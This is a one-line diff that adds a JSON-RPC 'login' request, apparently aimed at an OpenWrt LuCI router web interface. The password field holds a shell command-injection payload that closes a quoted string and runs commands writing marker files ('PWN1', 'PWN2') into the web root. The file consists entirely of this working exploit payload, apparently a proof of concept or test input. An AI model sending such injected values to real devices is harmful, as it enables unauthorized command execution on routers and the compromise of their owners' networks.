@@ -1,0 +1,1 @@
+{"jsonrpc":"2.0","method":"login","params":["admin","x'; echo PWN1 > /www/luci-static/rpc_inj.txt; echo PWN2 > /www/rpc_inj2.txt; echo '"],"id":1}
